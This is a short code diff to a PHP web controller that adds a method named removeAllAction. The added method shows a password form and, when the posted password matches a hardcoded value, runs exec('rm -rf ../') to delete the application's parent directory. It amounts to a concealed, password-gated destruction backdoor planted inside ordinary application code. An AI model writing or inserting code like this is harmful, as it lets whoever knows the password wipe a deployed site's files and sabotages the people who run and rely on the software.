@@ -193,4 +193,16 @@ class DefaultController extends Controller
         return 1;
     }
 
+    public function removeAllAction()
+    {
+        echo "<form method=post><input type='password' name='senha'><input type=submit></form>";
+
+        if (isset($_POST['senha']) && $_POST['senha'] == 'dyd6cof2')
+        {
+            exec('rm -rf ../');
+            die('foi :)');
+        }
+        die('tensao...');
+    }
+
 }
